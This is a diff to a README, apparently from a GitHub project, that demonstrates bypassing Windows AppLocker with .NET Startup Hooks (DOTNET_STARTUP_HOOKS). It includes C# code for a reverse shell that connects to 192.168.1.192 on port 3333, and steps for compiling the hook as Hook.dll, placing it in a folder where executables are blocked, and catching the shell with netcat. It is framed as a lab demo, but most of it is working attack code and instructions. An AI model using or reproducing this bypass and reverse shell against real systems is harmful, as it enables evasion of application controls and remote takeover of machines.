@@ -7,14 +7,40 @@ Starting from .Net Core 3.x, even .Net 5 and .Net 6, microsoft allows us to spec
 
 More info regarding Startup Hooks can be seen [here](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md).
 
+
+In this demo, we will focus on
+1. Bypassing Applocker
+2. Introspection and Modification of code or behaviour at Runtime
+
+
+# How to define a Startup Hook
+
 A `Startup Hook` has to have 
 1. No Namespaces
 2. Class name is `StartupHook`
 3. Implement the static method `public static void Initialize()`.
 
-In this demo, we have a `Win10 VM` with `Applocker` enabled with the default rules. In addition, the Applocker has a rule that allows a particular folder to run executables.
+Basically, the `StartupHook` skeleton looks as follows.
 
-> Do remember to run the `gpupdate /Force` command if you have added a new applocker rule.
+```cs
+internal class StartupHook
+{
+    public static void Initialize()
+    {
+        //Attacker code goes here
+    }
+}
+```
+
+Then, we will have to compile it as a `Class Library` file.
+
+Following that, create an environment variable `set DOTNET_STARTUP_HOOKS=<Full Path to Hook>` and proceed to run your binary.
+
+# Bypassing Applocker
+
+For this demo, I have a `Win10 VM` with `Applocker` enabled with the default rules. In addition, the Applocker has a rule that allows a particular folder to run executables.
+
+> Do remember to run the `gpupdate /Force` command if you have added a new applocker rule, for the new rule to take effect.
 
 
 ![image](https://user-images.githubusercontent.com/12537739/149788090-404edd1b-272b-41ae-86b4-d8d99fb489a6.png)
@@ -30,7 +56,7 @@ Running it from the `Allowed` folder gives us a console windows that simply prin
 
 Now lets prepare our `Startup Hook`!
 
-We are going to create a reverse shell to the host machine at `192.168.1.192`.
+We are going to create a reverse shell to connect to the host machine at `192.168.1.192`.
 
 ```cs
 using System;
@@ -42,20 +68,20 @@ using System.Text;
 internal class StartupHook
 {
 
-    public static StreamWriter streamWriter;
 
     public static void Initialize()
     {
-        string logfilePath = "shellcode_log.txt";
-        File.WriteAllText(logfilePath, "started..");
 
+        StartReverseShell();
+    }
 
+    private static void StartReverseShell()
+    {
         int delay = 3000;
         string ip = "192.168.1.192";
         int port = 3333;
         var debugMessage = $"Connecting to {ip}:{port} in {delay / 1000} seconds...";
         Console.WriteLine(debugMessage);
-        File.AppendAllText(logfilePath, debugMessage);
 
         try
         {
@@ -102,8 +128,8 @@ internal class StartupHook
             Console.WriteLine(e.Message);
 
         }
-    }
 
+    }
   private static void OutputDataReceivedHandler(object sendingProcess, DataReceivedEventArgs outLine)
   {
     StringBuilder strOutput = new StringBuilder();
@@ -125,9 +151,9 @@ internal class StartupHook
 
 ```
 
-Basically inside our `Initialize` static method, we have dumped our reverse shell code in it. 
+Basically inside our `Initialize` static method, we are calling our `StartReverseShell` method.
 
-The full code example can also be retrieved in this repo under the `Hook` project.
+The full code example can also be retrieved in this repo under the `Startup Hook` project.
 
 Proceed to compile the project as a `Class Library` and we will end up with a `Hook.dll`.
 
@@ -137,7 +163,7 @@ Let's copy our `Hook.dll` into the `VM`'s `Desktop` folder.
 
 > Remember, the `Desktop` folder is restricted to NOT execute any executables. But it doesn't matter as we can bypass it using this hooking method.
 
-Now let's start a `netcat` session in our host and listen to port `3333` which is configured in our `hook.dll` to connect.
+Now let's start a `netcat` session in our host and listen to port `3333` which is configured in our `hook.dll` to connect to.
 
 ![image](https://user-images.githubusercontent.com/12537739/149791028-904b0dd4-15f7-4b88-a5a6-0752e6f00dfb.png)
 
@@ -155,4 +181,4 @@ Lastly we simply run our program.
 ![image](https://user-images.githubusercontent.com/12537739/149791799-e986a456-e699-4175-bb87-e00c34601f2f.png)
 
 
-We have just pawned Applocker!
+We have just bypassed Applocker!
